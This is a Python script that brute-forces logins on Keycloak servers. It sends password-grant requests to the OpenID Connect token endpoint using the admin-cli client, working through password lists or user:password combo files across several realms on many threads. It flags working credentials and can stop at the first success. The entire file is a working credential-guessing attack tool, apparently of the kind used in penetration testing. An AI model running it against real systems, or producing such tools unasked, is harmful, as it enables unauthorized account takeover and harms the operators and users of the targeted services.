#!/usr/bin/env python3
import argparse
import csv
import logging
import os
import sys
import threading
from collections import namedtuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from time import sleep

import requests
from tqdm import tqdm

thread_local = threading.local()
LoginResult = namedtuple(
    "LoginResult", ["url", "realm", "user", "password", "response"]
)
request_semaphore = threading.Semaphore(20)


def get_session_for_thread():
    """Because requests.session is not thread-safe, we obtain one session per thread"""
    if not hasattr(thread_local, "session"):
        thread_local.session = requests.Session()
        logger.debug(f"Granting session: {id(thread_local.session)}")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
    }
    # merge headers
    thread_local.session.headers = headers
    logger.debug(thread_local.session.headers)
    return thread_local.session


def setup_logging():
    logger = logging.getLogger(__name__)
    logger.setLevel(logging.INFO)
    sh = logging.StreamHandler(sys.stdout)
    formatter = logging.Formatter(
        "%(asctime)s - %(name)s - %(levelname)s - %(funcName)s:%(lineno)d - %(message)s"
    )
    sh.setFormatter(formatter)
    logger.addHandler(sh)
    return logger


logger = setup_logging()


def try_login(url, realm, user, password, headers=None, pause=0):
    """
    Attempt login on API endpoint and return response
    Additional headers may be set in addition to those already defined
    at session level
    """
    with request_semaphore:
        session = get_session_for_thread()
        logger.debug(f"Using session ID: {id(session)} - password: {password}")

        # simulate a fake response
        # response = requests.Response()
        # response.status_code = 401
        # response.json =  {"error":"Realm does not exist"}
        # if password == "ashley":
        #     response.status_code = 200
        #     response.json = {"message": "success"}
        # if password == "happening":
        #     response.status_code = 500
        #     response.json = {"message": "server error"}
        # if password == "passw0rd":
        #     raise OSError("ouch")
        # result = LoginResult(url=url, realm=realm, user=user, password=password, response=response)
        # logger.debug(f"result: {result}")
        # sleep(pause)
        # return result
        response = session.post(
            url=f"{url}/realms/{realm}/protocol/openid-connect/token",
            headers=headers,
            data={
                "client_id": "admin-cli",
                "grant_type": "password",
                "username": user,
                "password": password,
            },
        )
        sleep(pause)
        logger.debug(
            f"Response (code: {response.status_code}): {response.text}"
        )
        result = LoginResult(
            url=url,
            realm=realm,
            user=user,
            password=password,
            response=response,
        )
        return result


def read_csv_file(filename, delimiter=","):
    with open(filename, "r", newline="") as f:
        headers = ["user", "password"]
        reader = csv.DictReader(
            f, delimiter=delimiter, fieldnames=headers, quoting=csv.QUOTE_NONE
        )
        for row in reader:
            yield row


def read_file(filename):
    with open(filename, "r", newline="") as f:
        for line in f:
            yield line.strip()


def is_valid_file(path):
    if not os.path.exists(path):
        raise argparse.ArgumentTypeError(f"file {path} does not exist")
    else:
        return path


def parse_header_argument(header):
    """
    Validate header passed from CLI as string eg:
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0
    """
    items = header.split(":")
    if len(items) < 2:
        raise argparse.ArgumentTypeError(
            f"Invalid header value: {header}, expecting key: value"
        )

    key = items[0].strip()
    value = ":".join(items[1:]).strip()
    return {key: value}


def create_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--threads",
        type=int,
        dest="threads",
        choices=range(1, 33),
        default=1,
        help="Number of threads to use",
    )
    parser.add_argument(
        "--pause",
        type=int,
        dest="pause",
        default=0,
        help="Number of milliseconds to wait between request (per thread)",
    )
    parser.add_argument(
        "--header",
        type=parse_header_argument,
        default=[],
        action="extend",
        nargs="*",
        help="Add custom headers",
    )
    parser.add_argument(
        "--url", dest="url", required=True, help="Keycloak API endpoint URL"
    )
    parser.add_argument(
        "--realms",
        "-r",
        dest="realms",
        default="master",
        help="List of realms to test, comma-separated",
    )

    group = parser.add_argument_group()
    exclusive_group = group.add_mutually_exclusive_group(required=True)
    exclusive_group.add_argument("--user", dest="user", help="Single user")
    exclusive_group.add_argument(
        "--user-password-file",
        type=is_valid_file,
        dest="user_password_file",
        help="File containing list of users AND passwords",
    )

    parser.add_argument(
        "--password-file",
        type=is_valid_file,
        dest="password_file",
        help="File containing list of passwords",
    )
    parser.add_argument(
        "--delimiter",
        "-d",
        dest="delimiter",
        default=":",
        help="CSV delimiter",
    )
    parser.add_argument(
        "--start-from",
        dest="start_from",
        type=int,
        default=0,
        help="Resume from line number",
    )
    parser.add_argument(
        "--stop-on-success",
        action="store_true",
        dest="stop_on_success",
        default=False,
        help="Stop after one successful login",
    )
    args = parser.parse_args()
    # print(args)
    # sys.exit()
    # make dependent arguments
    if args.user and not args.password_file:
        parser.error("--password-file is required when --user is used")

    if args.realms.strip() == "":
        parser.error("The list of realms is empty")

    return parser


def main():
    parser = create_parser()
    args = parser.parse_args()

    # merge headers into one dict
    headers = {}
    for item in args.header:
        logger.debug(f"Add custom header: {item}")
        headers.update(item)

    # convert realms to list
    realms = [realm.strip() for realm in args.realms.split(",")]

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        """
        We use a semaphore which acts like a limiting queue,
        so that the password iterator is consumed in chunks
        source: https://realpython.com/python-thread-lock/#limiting-access-with-semaphores
        """

        # use a single user and a password file
        if args.password_file:
            user = args.user
            password_iterator = read_file(args.password_file)
            futures = (
                executor.submit(
                    try_login,
                    args.url,
                    realm,
                    user,
                    password,
                    headers,
                    args.pause / 1000,
                )
                for password in password_iterator
                for realm in realms
            )

        # use a combo file (user:password)
        elif args.user_password_file:
            password_iterator = read_csv_file(
                args.user_password_file, delimiter=args.delimiter
            )
            futures = (
                executor.submit(
                    try_login,
                    args.url,
                    realm,
                    row.get("user"),
                    row.get("password"),
                    headers,
                    args.pause / 1000,
                )
                for row in password_iterator
                for realm in realms
            )

        # futures = (executor.submit(try_login,  args.url, realm, user, password) for password in password_iterator)
        with tqdm(unit="req") as pbar:

            # resume from line number if specified -> advance generator
            if args.start_from > 0:
                tqdm.write(f"Resuming from line: {args.start_from}")
                try:
                    for _ in range(args.start_from - 1):
                        next(password_iterator)
                except StopIteration:
                    tqdm.write("Warning: Reached the end of the file")

            # Iterate over futures as they complete, stop if a task reports an exception
            for counter, future in enumerate(as_completed(futures), start=1):
                # sleep for a number of milliseconds
                # sleep(args.pause/1000)
                try:
                    result = future.result()
                except Exception as ex:
                    tqdm.write(f"An exception occurred: {ex}")
                    executor.shutdown(wait=False, cancel_futures=True)
                    break

                pbar.set_description(
                    f"Trying [{counter}] {result.user}/{result.password} ({result.realm}) -> {result.response.status_code}"
                )
                pbar.update(1)

                message = f"User: {result.user} - Password: {result.password} - Response: Status code: {result.response.status_code} - Output: {result.response.text}"
                logger.debug(message)

                match result.response.status_code:
                    case 200:
                        tqdm.write(
                            f"Valid credentials possibly found! - User: {result.user} - Password: {result.password} - Realm: {result.realm}"
                        )
                        if args.stop_on_success:
                            message = "Stopping after one successful login"
                            logger.info("Stopping after one successful login")
                            tqdm.write(message)
                            executor.shutdown(wait=False, cancel_futures=True)
                            break
                    case 400:
                        # This is to handle not fully set up accounts eg:
                        # {"error":"invalid_grant","error_description":"Account is not fully set up"}
                        tqdm.write(
                            f"Unexpected response - User: {result.user} - Password: {result.password} - Realm: {result.realm} - Response: {result.response.json()}"
                        )
                    case 401:
                        pass
                    case _:
                        tqdm.write(
                            f"Unexpected response - User: {result.user} - Password: {result.password} - Realm: {result.realm} - Response: {result.response.json()}"
                        )
                        executor.shutdown(wait=False, cancel_futures=True)
                        break

            tqdm.write("Done")


if __name__ == "__main__":
    main()
